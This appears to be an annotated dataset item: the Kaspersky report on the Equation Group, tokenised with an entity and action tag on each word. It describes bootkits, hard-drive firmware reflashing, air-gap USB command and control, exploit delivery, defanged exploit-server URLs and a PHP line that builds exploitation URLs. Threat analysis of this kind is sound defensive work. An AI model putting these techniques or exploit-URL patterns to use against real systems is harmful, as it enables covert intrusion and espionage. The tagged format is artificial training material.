The O
Equation O
group O
is O
a O
highly O
sophisticated O
threat O
actor O
that O
has O
been O
engaged O
in O
multiple O
CNE O
( O
computer O
network O
exploitation O
) O
operations O
dating O
back O
to O
2001 O
, O
and O
perhaps O
as O
early O
as O
1996 O
. O

The O
Equation O
group O
uses O
multiple O
malware O
platforms O
, O
some O
of O
which O
surpass O
the O
well O
- O
known O
" O
Regin O
" O
threat O
in O
complexity O
and O
sophistication O
. O

The O
Equation O
group O
is O
probably O
one O
of O
the O
most O
sophisticated O
cyber O
attack O
groups O
in O
the O
world O
; O
and O
they O
are O
the O
most O
advanced O
threat O
actor O
we O
have O
seen O
. O

We O
call O
this O
threat O
actor O
the O
Equation O
group O
because O
of O
their O
love O
for O
encryption O
algorithms O
and O
obfuscation O
strategies O
and O
the O
sophisticated O
methods O
used O
throughout O
their O
operations O
. O

In O
general O
, O
the O
Equation O
group O
uses O
a O
specific O
implementation O
of O
the O
RC5 O
encryption O
algorithm O
throughout O
their O
malware O
. O

Some O
of O
the O
most O
recent O
modules O
use O
RC6 O
, O
RC4 O
and O
AES O
too O
, O
in O
addition O
to O
other O
cryptographic O
functions O
and O
hashes O
. O

One O
technique O
in O
particular O
caught O
our O
attention O
and O
reminded O
us O
of O
another O
complex O
malware O
, O
Gauss O
. O

The O
GrayFish O
loader O
uses O
SHA-256 O
one O
thousand O
times O
over O
the O
unique O
NTFS O
object O
ID O
of O
the O
victim O
's O
Windows O
folder O
to O
decrypt O
the O
next O
stage O
from O
the O
registry O
. O

This O
uniquely O
ties O
the O
infection O
to O
the O
specific O
machine O
, O
and O
means O
the O
payload O
can O
not O
be O
decrypted O
without O
knowing O
the O
NTFS O
object O
ID O
. O

the O
Equation O
group O
use O
? O
So O
far O
, O
we O
've O
identified O
several O
malware O
platforms O
used O
exclusively O
by O
the O
Equation O
group O
. O

They O
are O
. O

The O
Equation O
group O
uses O
an O
implant O
known O
as O
DoubleFantasy O
( O
the O
internal O
Kaspersky O
Lab O
name O
) O
for O
the O
validation O
of O
their O
victims O
. O

The O
implant O
serves O
two O
purposes O
. O

Decrypted O
DoubleFantasy O
configuration O
block O
In O
the O
configuration O
block O
above O
, O
one O
can O
easily O
spot O
the O
internal O
version O
8.2.0.6 O
. O

Decrypting O
configuration O
blocks O
from O
all O
known O
DoubleFantasy O
samples O
, O
we O
obtained O
the O
following O
internal O
version O
numbers O
. O

Interestingly O
, O
the O
most O
popular O
versions O
are O
8 O
and O
12 O
. O

Considering O
the O
latest O
version O
of O
DoubleFantasy O
is O
13 O
and O
we O
have O
only O
identified O
4 O
major O
versions O
, O
we O
are O
probably O
seeing O
only O
a O
small O
part O
of O
the O
group O
's O
activity O
. O

EQUATIONDRUG O
is O
one O
of O
the O
group O
's O
most O
complex O
espionage O
platforms O
. O

The O
platform O
was O
developed O
between O
2003 O
and O
2013 O
and O
subsequently O
replaced O
by O
GrayFish O
. O

It O
appears O
to O
have O
been O
created O
as O
an O
upgrade O
from O
the O
EQUATIONLASER O
platform O
. O

A O
victim O
does O
n't O
immediately O
get O
infected O
with O
EQUATIONDRUG O
. O

First O
, O
the O
attackers O
infect O
them O
with O
DOUBLEFANTASY O
, O
which O
is O
a O
validator O
- O
style O
plugin O
. O

If O
the O
victim O
is O
confirmed O
as O
interesting O
to O
the O
attackers O
, O
the O
EQUATIONDRUG O
installer O
is O
delivered O
. O

By O
default O
, O
a O
core O
set O
of O
modules O
is O
installed O
onto O
the O
target O
's O
computer O
together O
with O
EQUATIONDRUG O
, O
giving O
attackers O
full O
control O
over O
the O
operating O
system O
. O

In O
cases O
where O
the O
basic O
features O
of O
the O
malware O
are O
not O
enough O
, O
EquationDrug O
supports O
the O
addition O
of O
new O
plugins O
to O
extend O
its O
functionality O
. O

We O
found O
35 O
different O
plugins O
for O
EquationDrug O
and O
18 O
drivers O
. O

EquationDrug O
's O
core O
modules O
, O
designed O
for O
hooking O
deep O
into O
the O
OS O
, O
do O
not O
contain O
a O
trusted O
digital O
signature O
and O
can O
not O
be O
run O
directly O
on O
modern O
operating O
systems O
. O

The O
code O
checks O
whether O
the O
OS O
version O
predates O
Windows O
XP/2003 O
. O

Some O
of O
the O
plugins O
were O
designed O
originally O
for O
use O
on O
Windows O
95/98/ME O
. O

If O
the O
target O
is O
using O
a O
modern O
operating O
system O
such O
as O
Windows O
7 O
, O
the O
attackers O
use O
the O
TripleFantasy O
or O
GrayFish O
platforms O
. O

EquationDrug O
has O
an O
integrated O
countdown O
timer O
, O
presumably O
designed O
to O
self- O
destruct O
if O
commands O
are O
not O
received O
from O
the O
C&C O
for O
a O
period O
of O
time O
( O
several O
months O
) O
. O

The O
information O
stolen O
from O
the O
PC O
and O
prepared O
for O
transmission O
to O
the O
C&C O
is O
stored O
in O
encrypted O
form O
throughout O
several O
fake O
font O
files O
( O
* O
.FON O
) O
inside O
the O
Windows\Fonts O
folder O
on O
the O
victim O
's O
computer O
. O

GRAYFISH O
is O
the O
most O
modern O
and O
sophisticated O
malware O
implant O
from O
the O
Equation O
group O
. O

It B-Entity
is O
designed O
to O
provide B-Action
an O
effective B-Entity
( I-Entity
almost I-Entity
" I-Entity
invisible I-Entity
" I-Entity
) I-Entity
persistence I-Entity
mechanism I-Entity
, O
hidden B-Entity
storage I-Entity
and O
malicious B-Entity
command I-Entity
execution I-Entity
inside B-Modifier
the O
Windows B-Entity
operating I-Entity
system I-Entity
. O

By O
all O
indications O
, O
GrayFish O
was O
developed O
between O
2008 O
and O
2013 O
and O
is O
compatible O
with O
all O
modern O
versions O
of O
Microsoft O
's O
operating O
systems O
, O
including O
Windows O
NT O
4.0 O
, O
Windows O
2000 O
, O
Windows O
XP O
, O
Windows O
Vista O
, O
Windows O
7 O
and O
8 O
– O
both O
32-bit O
and O
64-bit O
versions O
. O

GrayFish O
includes O
a O
highly O
sophisticated O
bootkit O
, O
which O
is O
more O
complex O
than O
any O
we O
've O
seen O
before O
. O

This O
suggests O
developers O
of O
the O
highest O
caliber O
are O
behind O
its O
creation O
. O

When O
the O
computer O
starts O
, O
GrayFish B-Entity
hijacks B-Action
the O
OS B-Entity
loading I-Entity
mechanisms I-Entity
by O
injecting B-Action
its O
code B-Entity
into B-Modifier
the O
boot B-Entity
record I-Entity
. O

This O
allows O
it O
to O
control O
the O
launching O
of O
Windows O
at O
each O
stage O
. O

In O
fact O
, O
after O
infection O
, O
the O
computer O
is O
not O
run O
by O
itself O
more O
: O
it O
is O
GrayFish O
that O
runs O
it O
step O
by O
step O
, O
making O
the O
necessary O
changes O
on O
the O
fly O
. O

After O
GrayFish O
starts O
Windows O
, O
it O
launches O
a O
multi O
- O
stage O
mechanism O
( O
four O
to O
five O
stages O
) O
of O
decryption O
to O
achieve O
code O
execution O
within O
the O
Windows O
environment O
. O

It O
then O
runs O
the O
functional O
modules O
that O
are O
stored O
inside O
the O
Windows O
registry O
. O

Each O
stage O
decodes O
and O
executes O
the O
next O
, O
and O
the O
entire O
platform O
will O
only O
start O
after O
successful O
execution O
of O
all O
levels O
. O

If B-Modifier
an O
error B-Entity
happens I-Entity
during I-Entity
launch I-Entity
, O
the B-Entity
entire I-Entity
GrayFish I-Entity
platform I-Entity
self O
- B-Action
destructs I-Action
. O

To B-Modifier
store O
stolen B-Entity
information I-Entity
, O
as O
well O
as O
its O
own O
auxiliary O
information O
, O
GrayFish B-Entity
implements B-Action
its O
own B-Entity
encrypted I-Entity
Virtual I-Entity
File I-Entity
System I-Entity
( I-Entity
VFS I-Entity
) I-Entity
inside B-Modifier
the O
Windows B-Entity
registry I-Entity
. O

To O
bypass O
modern O
OS O
security O
mechanisms O
that O
block O
the O
execution O
of O
untrusted O
code O
in O
kernel O
mode O
, O
GrayFish O
exploits O
several O
legitimate O
drivers O
, O
including O
one O
from O
the O
CloneCD O
program O
. O

This O
driver O
( O
ElbyCDIO.sys O
) O
contains O
a O
vulnerability O
which O
GrayFish O
exploits O
to O
achieve O
kernel O
- O
level O
code O
execution O
. O

Despite O
the O
fact O
that O
the O
vulnerability O
was O
discovered O
in O
2009 O
, O
the O
digital O
signature O
has O
not O
yet O
been O
revoked O
. O

The O
GrayFish B-Entity
implementation I-Entity
appears O
to O
have O
been O
designed O
to O
make B-Action
it B-Entity
invisible B-Entity
to B-Modifier
antivirus O
products B-Entity
. O

When O
used O
together O
with O
the O
bootkit O
, O
all B-Entity
the I-Entity
modules I-Entity
as I-Entity
well I-Entity
as I-Entity
the I-Entity
stolen I-Entity
data I-Entity
are O
stored B-Action
in B-Modifier
encrypted O
form B-Entity
in I-Entity
the I-Entity
registry I-Entity
and O
dynamically O
decrypted O
and O
executed O
. O

There O
are O
no O
malicious O
executable O
modules O
at O
all O
on O
the O
filesystem O
of O
an O
infected O
system O
. O

An O
interesting O
observation O
: O
the O
first O
stage O
GRAYFISH O
loader O
computes O
the O
SHA-256 O
hash O
of O
the O
NTFS O
of O
system O
folder O
( O
% O
Windows% O
or O
% O
System% O
) O
Object_ID O
one O
thousand O
times O
. O

The O
result O
is O
used O
as O
an O
AES O
decryption O
key O
for O
the O
next O
stage O
. O

This O
is O
somewhat O
similar O
to O
Gauss O
, O
which O
computed O
the O
MD5 O
hash O
over O
the O
name O
of O
its O
target O
folder O
10,000 O
times O
and O
used O
the O
result O
as O
the O
decryption O
key O
. O

Fanny O
is O
a O
computer O
worm O
created O
by O
the O
Equation O
group O
in O
2008 O
and O
distributed O
throughout O
the O
Middle O
East O
and O
Asia O
. O

Fanny O
used O
two O
zero O
- O
day O
exploits O
, O
which O
were O
later O
uncovered O
during O
the O
discovery O
of O
Stuxnet O
. O

To O
spread O
, O
it O
used O
the O
Stuxnet O
LNK O
exploit O
and O
USB O
sticks O
. O

For O
escalation O
of O
privilege O
, O
Fanny O
used O
a O
vulnerability O
patched O
by O
the O
Microsoft O
bulletin O
MS09 O
- O
025 O
, O
which O
from O
2009 O
was O
also O
used O
in O
one O
of O
the O
early O
versions O
of O
Stuxnet O
. O

It O
's O
important O
to O
point O
out O
that O
these O
two O
exploits O
were O
used O
in O
Fanny O
before O
they O
were O
integrated O
into O
Stuxnet O
, O
indicating O
the O
EQUATION O
group O
had O
access O
to O
these O
zero O
- O
days O
before O
the O
Stuxnet O
group O
. O

Actually O
, O
the O
similar O
type O
of O
usage O
of O
both O
exploits O
together O
in O
different O
computer O
worms O
, O
at O
around O
the O
same O
time O
, O
indicates O
that O
the O
EQUATION O
group O
and O
the O
Stuxnet O
developers O
are O
either O
the O
same O
or O
working O
closely O
together O
. O

The O
main O
purpose O
of O
Fanny O
appears O
to O
have O
been O
the O
mapping O
of O
air O
- O
gapped O
networks O
. O

For O
this O
, O
it O
used O
a O
unique O
USB O
- O
based O
command O
and O
control O
mechanism O
. O

When O
a O
USB O
stick O
is O
infected O
, O
Fanny O
creates O
a O
hidden O
storage O
area O
on O
the O
stick O
. O

If O
it O
infects O
a O
computer O
without O
an O
internet O
connection O
, O
it B-Entity
will O
collect B-Action
basic O
system B-Entity
information I-Entity
and O
save B-Action
it B-Entity
onto B-Modifier
the O
hidden B-Entity
area I-Entity
of I-Entity
the I-Entity
stick I-Entity
. O

Later O
, O
when O
a O
stick O
containing O
hidden O
information O
is O
plugged O
into O
an O
internet O
- O
connected O
computer O
infected O
by O
Fanny O
, O
the B-Entity
data I-Entity
will O
be O
scooped O
up O
from O
the O
hidden O
area O
and O
sent B-Action
to B-Modifier
the O
C&C B-Entity
. O

If O
the O
attackers O
want O
to O
run O
commands O
on O
the O
air O
- O
gapped O
networks O
, O
they B-Entity
can O
save B-Action
these O
commands B-Entity
in B-Modifier
the O
hidden B-Entity
area I-Entity
of I-Entity
the I-Entity
USB I-Entity
stick I-Entity
. O

When O
the O
stick O
is O
plugged O
into O
the O
air O
- O
gapped O
computer O
, O
Fanny O
will O
recognize O
the O
commands O
and O
execute O
them O
. O

This O
effectively O
allowed O
the O
Equation O
group O
to O
run O
commands O
inside O
air O
- O
gapped O
networks O
through O
the O
use O
of O
infected O
USB O
sticks O
, O
and O
also O
map O
the O
infrastructure O
of O
such O
networks O
. O

The O
Fanny O
C&C O
server O
is O
currently O
sinkholed O
by O
Kaspersky O
Lab O
. O

The O
victims O
map O
looks O
as O
follows O
. O

group O
use O
? O
We O
observed O
the O
following O
exploits O
used O
by O
the O
Equation O
group O
in O
their O
malware O
. O

At O
least O
four O
of O
these O
were O
used O
as O
zero O
- O
days O
by O
the O
EQUATION O
group O
. O

In O
addition O
to O
these O
, O
we O
observed O
the O
use O
of O
unknown O
exploits O
, O
possibly O
zero O
- O
day O
, O
against O
Firefox O
17 O
, O
as O
used O
in O
the O
TOR O
Browser O
. O

An O
interesting O
case O
is O
the O
use O
of O
CVE-2013 O
- O
3918 O
, O
which O
was O
originally O
used O
by O
the O
APTgroup O
behind O
the O
2009 O
Aurora O
attack O
. O

The O
EQUATION O
group O
captured O
their O
exploit O
and O
repurposed O
it O
to O
target O
government O
users O
in O
Afghanistan O
. O

group O
malware O
? O
The O
Equation O
group O
relies O
on O
multiple O
techniques O
to O
infect O
their O
victims O
. O

These O
include O
. O

The O
attacks O
that O
use O
physical O
media O
( O
CD O
- O
ROMs O
) O
are O
particularly O
interesting O
because O
they O
indicate O
the O
use O
of O
a O
technique O
known O
as O
" O
interdiction O
" O
, O
where O
the O
attackers O
intercept O
shipped O
goods O
and O
replace O
them O
with O
Trojanized O
versions O
. O

One O
such O
incident O
involved O
targeting O
participants O
at O
a O
scientific O
conference O
in O
Houston O
. O

Upon O
returning O
home O
, O
some O
of O
the O
participants O
received O
by O
mail O
a O
copy O
of O
the O
conference O
proceedings O
, O
together O
with O
a O
slideshow O
including O
various O
conference O
materials O
. O

The O
compromised O
CD O
- O
ROM O
used O
" O
autorun.inf O
" O
to O
execute O
an B-Entity
installer I-Entity
that O
began O
by O
attempting O
to O
escalate B-Action
privileges B-Entity
using B-Modifier
two O
known B-Entity
EQUATION I-Entity
group I-Entity
exploits I-Entity
. O

Next O
, O
it B-Entity
attempted O
to O
run B-Action
the O
group B-Entity
's I-Entity
DOUBLEFANTASY I-Entity
implant I-Entity
and O
install B-Action
it B-Entity
onto B-Modifier
the O
victim B-Entity
's I-Entity
machine I-Entity
. O

The O
exact O
method O
by O
which O
these O
CDs O
were O
interdicted O
is O
unknown O
. O

We O
do O
not O
believe O
the O
conference O
organizers O
did O
this O
on O
purpose O
. O

At O
the O
same O
time O
, O
the O
super O
- O
rare O
DOUBLEFANTASY O
malware O
, O
together O
with O
its O
installer O
with O
two O
zero O
- O
day O
exploits O
, O
do O
n't O
end O
up O
on O
a O
CD O
by O
accident O
. O

Another O
example O
is O
a O
Trojanized O
Oracle O
installation O
CD O
that O
contains O
an O
EQUATIONLASER O
Trojan O
dropper O
alongside O
the O
Oracle O
installer O
. O

Here O
's O
a O
look O
at O
a O
typical O
infection O
cycle O
. O

about O
the O
EQUATION O
group O
? O
Although O
the O
implementation O
of O
their O
malware O
systems O
is O
incredibly O
complex O
, O
surpassing O
even O
Regin O
in O
sophistication O
, O
there O
is O
one O
aspect O
of O
the O
EQUATION O
group O
's O
attack O
technologies O
that O
exceeds O
anything O
we O
have O
ever O
seen O
before O
. O

This O
is O
the O
ability O
to O
infect B-Action
the O
hard B-Entity
drive I-Entity
firmware I-Entity
. O

We O
were O
able O
to O
recover O
two O
HDD O
firmware O
reprogramming O
modules O
from O
the O
EQUATIONDRUG O
and O
GRAYFISH O
platforms O
. O

The O
EQUATIONDRUG O
HDD O
firmware O
reprogramming O
module O
has O
version O
3.0.1 O
while O
the O
GRAYFISH O
reprogramming O
module O
has O
version O
4.2.0 O
. O

These O
were O
compiled O
in O
2010 O
and O
2013 O
, O
respectively O
, O
if O
we O
are O
to O
trust O
the O
PE O
timestamps O
. O

The O
EQUATION O
group O
HDD O
firmware O
reprogramming O
plugin O
has O
the O
internal O
ID O
80AA O
, O
which O
is O
a O
unique O
number O
in O
the O
groups O
' O
plugin O
ID O
table O
. O

This O
allows O
other O
plugins O
to O
identify O
and O
use O
it O
as O
required O
. O

Both O
32- O
and O
64-bit O
versions O
of O
the O
plugin O
were O
found O
. O

The O
plugin B-Entity
supports O
two O
main O
functions O
: O
reprogramming B-Action
the O
HDD B-Entity
firmware I-Entity
with B-Modifier
a O
custom B-Entity
payload I-Entity
from I-Entity
the I-Entity
EQUATION I-Entity
group I-Entity
, O
and O
providing B-Action
an O
API B-Entity
into B-Modifier
a O
set B-Entity
of I-Entity
hidden I-Entity
sectors I-Entity
( I-Entity
or I-Entity
data I-Entity
storage I-Entity
) I-Entity
of I-Entity
the I-Entity
hard I-Entity
drive I-Entity
. O

This O
achieves O
several O
important O
things O
. O

The O
plugin O
version O
4 O
is O
more O
complex O
and O
can O
reprogram O
12 O
drive O
" O
categories O
" O
. O

The O
classes O
supported O
are O
. O

The O
main O
function O
to O
reflash O
the O
HDD O
firmware O
receives O
an O
external O
payload O
, O
which O
can O
be O
compressed O
by O
LZMA O
. O

The O
disk O
is O
targeted O
by O
a O
specific O
serial O
number O
and O
reprogrammed O
by O
a O
series O
of O
ATA O
commands O
. O

For O
example O
, O
in O
the O
case O
of O
Seagate O
drives O
, O
we O
see O
a O
chain O
of O
commands O
: O
" O
FLUSH O
CACHE O
" O
( O
E7 O
) O
→ O
" O
DOWNLOAD O
MICROCODE O
" O
( O
92 O
) O
→ O
" O
IDENTIFY O
DEVICE O
" O
( O
EC O
) O
→ O
WRITE O
" O
LOG O
EXT O
" O
( O
3F O
) O
. O

Depending O
on O
the O
reflashing O
request O
, O
there O
might O
be O
some O
unclear O
data O
manipulations O
written O
to O
the O
drive O
using O
" O
WRITE O
LOG O
EXT O
" O
( O
3F O
) O
. O

For O
WD O
drives O
, O
there O
is O
a O
sub O
- O
routine O
searching O
for O
ARM O
NOP O
opcodes O
in O
read O
data O
, O
and O
then O
used O
further O
in O
following O
writes O
. O

Overall O
, O
the O
plugin O
uses O
a O
lot O
of O
undocumented O
, O
vendor O
- O
specific O
ATA O
commands O
, O
for O
the O
drives O
mentioned O
above O
as O
well O
as O
all O
the O
others O
. O

The O
EQUATION O
group O
's O
HDD O
firmware O
reprogramming O
module O
is O
extremely O
rare O
. O

During O
our O
research O
, O
we O
've O
only O
identified O
a O
few O
victims O
who O
were O
targeted O
by O
this O
module O
. O

This O
indicates O
that O
it O
is O
probably O
only O
kept O
for O
the O
most O
valuable O
victims O
or O
for O
some O
very O
unusual O
circumstances O
. O

indicating O
who O
is O
behind O
the O
EQUATION O
group O
? O
With O
threat O
actor O
groups O
as O
skilled O
as O
the O
Equation O
team O
, O
mistakes O
are O
rare O
. O

Nevertheless O
, O
they O
do O
happen O
. O

Some O
of O
the O
keywords O
forgotten O
in O
the O
modules O
that O
we O
analyzed O
include O
. O

Interestingly O
, O
the O
VTT O
strings O
above O
appear O
to O
contain O
a O
timestamp O
and O
an O
infection O
counter O
. O

Between O
four O
events O
– O
10 O
October O
2008 O
, O
30th O
of O
July O
2008 O
, O
3rd O
of O
September O
2008 O
and O
30 O
of O
September O
2008 O
– O
we O
count O
an O
average O
of O
2000 O
infections O
per O
month O
, O
if O
the O
serial O
number O
increases O
linearly O
. O

This O
could O
indicate O
that O
the O
EQUATION O
group O
hits O
about O
2000 O
users O
per O
month O
, O
although O
it O
's O
possible O
some O
" O
uninteresting O
" O
victims O
may O
be O
disinfected O
. O

Note O
: O
T O
he O
codename O
GROK O
appears O
in O
several O
documents O
published O
by O
Der O
Spiegel O
, O
where O
" O
a O
keylogger O
" O
is O
mentioned O
. O

Our O
analysis O
indicates O
EQUATIONGROUP O
's O
GROK O
plugin O
is O
indeed O
a O
keylogger O
on O
steroids O
that O
can O
perform O
many O
other O
functions O
. O

The O
victims O
of O
the O
Equation O
group O
were O
observed O
in O
more O
than O
30 O
countries O
, O
including O
Iran O
, O
Russia O
, O
Syria O
, O
Afghanistan O
, O
Kazakhstan O
, O
Belgium O
, O
Somalia O
, O
Hong O
Kong O
, O
Libya O
, O
United O
Arab O
Emirates O
, O
Iraq O
, O
Nigeria O
, O
Ecuador O
, O
Mexico O
, O
Malaysia O
, O
United O
States O
, O
Sudan O
, O
Lebanon O
, O
Palestine O
, O
France O
, O
Germany O
, O
Singapore O
, O
Qatar O
, O
Pakistan O
, O
Yemen O
, O
Mali O
, O
Switzerland O
, O
Bangladesh O
, O
South O
Africa O
, O
Philippines O
, O
United O
Kingdom O
, O
India O
and O
Brazil O
. O

Victims O
generally O
fall O
into O
the O
following O
categories O
. O

Combining O
statistics O
from O
KSN O
and O
our O
sinkhole O
, O
we O
counted O
more O
than O
500 O
victims O
worldwide O
. O

A O
lot O
of O
infections O
have O
been O
observed O
on O
servers O
, O
often O
domain O
controllers O
, O
data O
warehouses O
, O
website O
hosting O
and O
other O
types O
of O
servers O
. O

At O
the O
same O
time O
, O
the O
infections O
have O
a O
self O
- O
destruct O
mechanism O
, O
so O
we O
can O
assume O
there O
were O
probably O
tens O
of O
thousands O
of O
infections O
around O
the O
world O
throughout O
the O
history O
of O
the O
Equation O
group O
's O
operations O
. O

As O
an O
interesting O
note O
, O
some O
of O
the O
" O
patients O
zero O
" O
of O
Stuxnet O
seem O
to O
have O
been O
infected O
by O
the O
EQUATION O
group O
. O

It O
is O
quite O
possible O
that O
the O
EQUATION O
group O
malware O
was O
used O
to O
deliver O
the O
STUXNET O
payload O
. O

group O
implants O
use O
? O
The O
Equation O
group O
uses O
a O
vast O
C&C O
infrastructure O
that O
includes O
more O
than O
300 O
domains O
and O
more O
than O
100 O
servers O
. O

The O
servers O
are O
hosted O
in O
multiple O
countries O
, O
including O
the O
US O
, O
UK O
, O
Italy O
, O
Germany O
, O
Netherlands O
, O
Panama O
, O
Costa O
Rica O
, O
Malaysia O
, O
Colombia O
and O
Czech O
Republic O
. O

All O
C&C O
domains O
appear O
to O
have O
been O
registered O
through O
the O
same O
two O
major O
registrars O
, O
using O
" O
Domains O
By O
Proxy O
" O
to O
mask O
the O
registrant O
's O
information O
. O

Kaspersky O
Lab O
is O
currently O
sinkholing O
a O
couple O
dozen O
of O
the O
300 O
C&C O
servers O
. O

by O
the O
EQUATION O
group O
? O
The O
EQUATION O
group O
sometimes O
selects O
its O
victims O
with O
surgical O
precision O
. O

When O
precision O
is O
not O
possible O
, O
the O
victims O
are O
targeted O
by O
a O
validator O
( O
DOUBLEFANTASY O
) O
implant O
and O
subsequently O
disinfected O
if O
they O
do O
not O
appear O
to O
be O
" O
interesting O
" O
to O
the O
attackers O
. O

Here O
are O
some O
web O
- O
based O
targeting O
examples O
from O
the O
Equation O
group O
: O
On O
March O
2 O
, O
2013 O
, O
a B-Entity
Kaspersky I-Entity
Lab I-Entity
user I-Entity
browsing I-Entity
an I-Entity
online I-Entity
forum I-Entity
was O
attacked B-Action
with B-Modifier
an O
exploit B-Entity
from I-Entity
one I-Entity
of I-Entity
the I-Entity
Equation I-Entity
group I-Entity
's I-Entity
exploitation I-Entity
servers I-Entity
. O

2013 O
- O
03 O
- O
02 O
– O
technicalconsumerreports[.]com O
/ O
modular O
/ O
assemble.php?params O
= O
YoGKKdExT[snip O
] O
cS5kS5t0bvGQyB8miDu+Agn O
– O
detected O
HEUR O
: O
Exploit O
. O
Script O
. O
Generic O
The O
attack O
was O
unsuccessful O
as O
it O
was O
caught O
by O
our O
product O
and O
the O
user O
was O
protected O
. O

The O
attack O
was O
targeting O
Firefox O
17 O
( O
TOR O
Browser O
) O
, O
using O
an O
unknown O
exploit O
that O
we O
have O
not O
recovered O
. O

Looking O
further O
, O
we O
identified O
a O
few O
other O
known O
Equation O
servers O
used O
in O
similar O
attacks O
even O
earlier O
. O

2012 O
- O
12 O
- O
11 O
– O
technology O
- O
revealed[.]com O
/ O
diagram O
/ O
navigate.html?overlay O
= O
AL[snip]OISn6sI1&sn O
= O
d1[SNIP]dd O
These O
attacks O
were O
delivered O
in O
several O
ways O
– O
for O
example O
, O
while O
the O
user O
visited O
a O
number O
of O
Islamic O
Jihadist O
discussion O
forums O
, O
or O
via O
advertisements O
on O
popular O
websites O
in O
the O
Middle O
East O
. O

The O
forums O
in O
question O
appear O
to O
have O
been O
compromised O
by O
a B-Entity
specific I-Entity
PHP I-Entity
script I-Entity
that O
exploited B-Action
only O
authenticated B-Entity
visitors I-Entity
. O

We O
were O
able O
to O
obtain O
one O
of O
these O
PHP O
scripts O
embedded O
in O
a O
discussion O
forum O
. O

This O
PHP O
script O
provides O
a O
multitude O
of O
interesting O
information O
about O
the O
attacks O
. O

It O
was O
first O
designed O
to O
work O
as O
part O
of O
vBulletin O
, O
a O
commercial O
forum O
platform O
. O

It O
specifically O
checks O
if O
the O
visitor O
's O
username O
MD5 O
matches O
two O
values O
. O

Converting O
the O
ranges O
to O
their O
respective O
countries O
( O
except O
for O
64.38.3.50 O
, O
which O
is O
the O
only O
specific O
IP O
mentioned O
) O
we O
get O
the O
following O
TOP O
3 O
countries O
that O
will O
NOT O
be O
exploited O
. O

This O
means O
that O
the O
attackers O
have O
taken O
special O
care O
not O
to O
infect O
users O
visiting O
from O
certain O
ISPs O
in O
these O
countries O
. O

If O
the O
visitors O
are O
from O
any O
other O
IP O
range O
, O
the O
PHP O
script O
constructs O
an O
exploitation O
URL O
which O
includes O
the O
logged O
in O
vBulletin O
forum O
name O
. O

$ O
htt="http://technology O
- O
revealed[.]com O
/ O
expand O
/ O
order.php?design O
= O
ABRSRgDQlkUALAxGANDrRu O
QQofe6Y0THS8E3hfBC+M+k7CdBmTH5gAkLvgV8EV3ULW+7KoUjbJ4UOFU6SVOtgEK7zTgPPNoDH O
z4vKecDGe7OzDmJlvwKvc5uYg O
/ O
I/5x9 O
" O
; O
$ O
htt=$htt."&sn=".bin2hex(substr($u,0,14 O
) O
) O
; O
The O
vBulletin O
forum O
username O
is O
stored O
in O
hex O
, O
as O
the O
" O
sn= O
" O
parameter O
to O
the O
exploit O
site O
. O

The O
exploit O
site O
can O
choose O
to O
hit O
the O
visitor O
with O
an O
exploit O
depending O
on O
the O
username O
, O
meaning O
that O
the B-Entity
attackers I-Entity
are O
taking O
great O
care O
to O
infect B-Action
only O
very B-Entity
specific I-Entity
targets I-Entity
on B-Modifier
these O
forums B-Entity
. O

Interestingly O
, O
the O
PHP O
script O
produces O
a O
different O
HTML O
page O
for O
iPhone O
visitors O
. O

This O
indicates O
that O
the O
exploit O
server O
is O
probably O
aware O
of O
iPhone O
visitors O
and O
can O
deliver O
exploits O
for O
them O
as O
well O
; O
otherwise O
, O
the O
exploitation O
URL O
can O
simply O
be O
removed O
for O
these O
visitors O
. O

Most O
recently O
, O
the O
attackers O
used O
Java O
exploits O
, O
delivered O
through O
a O
specific O
server O
to O
visitors O
from O
the O
Middle O
East O
via O
advertising O
networks O
on O
popular O
websites O
. O

Here O
's O
an O
example O
. O

standardsandpraiserepurpose[.]com O
/ O
login?qq=5eaae4d[SNIP]0563&rr=1&h O
= O
cc593a6bfd8e1e O
26c2734173f0ef75be3527a205 O
, O
header O
> O
26 O
< O
/header O
> O
These O
2013 O
- O
2014 O
attacks O
make O
use O
of O
a O
new O
domain O
, O
standardsandpraiserepurpose[.]com O
. O

Interesting O
to O
point O
out O
the O
similarity O
in O
the O
URL O
construction O
, O
with O
parameters O
" O
rr=1 O
" O
, O
followed O
by O
" O
h= O
" O
a O
value O
resembling O
a O
SHA1 O
hash O
, O
possibly O
the O
specific O
targeted O
username O
. O

Other O
collected O
" O
h= O
" O
values O
include O
the O
following O
. O

Considering O
the O
length O
and O
format O
, O
one O
might O
suspect O
they O
are O
a O
SHA1 O
hash O
, O
however O
, O
unlike O
the O
forum O
MD5 O
hashes O
, O
we O
could O
n't O
break O
any O
of O
them O
. O

The O
exploits O
from O
standardsandpraiserepurpose[.]com O
targeted O
several O
Kaspersky O
Lab O
users O
and O
were O
all O
unsuccessful O
. O

The O
server O
attempts O
three O
different O
Java O
exploits O
, O
containing O
the O
same O
payload O
stored O
as O
" O
info.dat O
" O
inside O
the O
Java O
archive O
. O

These O
are O
simple O
downloaders O
that O
contain O
shellcode O
to O
download O
and O
execute O
the O
next O
stage O
from O
the O
C&C. O

Unfortunately O
, O
we O
were O
n't O
able O
to O
download O
a O
copy O
of O
the O
next O
stage O
as O
the O
URL O
was O
already O
dead O
at O
the O
time O
of O
checking O
, O
or O
else O
it O
is O
only O
served O
and O
built O
specifically O
for O
victims O
at O
specific O
IPs O
. O

Another O
unusual O
aspect O
of O
targeting O
included O
multiple O
infection O
attempts O
against O
users O
of O
a O
certain O
satellite O
internet O
provider O
in O
Afghanistan O
. O

are O
used O
by O
the O
EQUATION O
group O
? O
The O
Equation O
group O
uses O
the O
RC5 O
and O
RC6 O
encryption O
algorithms O
quite O
extensively O
throughout O
their O
creations O
. O

They O
also O
use O
simple O
XOR O
, O
substitution O
tables O
, O
RC4 O
and O
AES O
. O

RC5 O
and O
RC6 O
are O
two O
encryption O
algorithms O
designed O
by O
Ronald O
Rivest O
in O
1994 O
and O
1998 O
. O

They O
are O
very O
similar O
to O
each O
other O
, O
with O
RC6 O
introducing O
an O
additional O
multiplication O
in O
the O
cypher O
to O
make O
it O
more O
resistant O
. O

Both O
cyphers O
use O
the O
same O
key O
setup O
mechanism O
and O
the O
same O
magical O
constants O
named O
P O
and O
Q. O

The O
RC5/6 O
implementation O
from O
Equation O
group O
's O
malware O
is O
particularly O
interesting O
and O
deserves O
special O
attention O
because O
of O
its O
specifics O
. O

In O
the O
screenshot O
above O
, O
one O
can O
observe O
the O
main O
loop O
of O
a O
RC6 O
key O
setup O
subroutine O
extracted O
from O
one O
of O
the O
Equation O
group O
samples O
. O

This O
is O
how O
it O
looks O
in O
pseudocode O
. O

See O
: O
http://www.ussrback.com/crypto/misc/rc5ref.c O
Interestingly O
, O
the O
so O
- O
called O
Q O
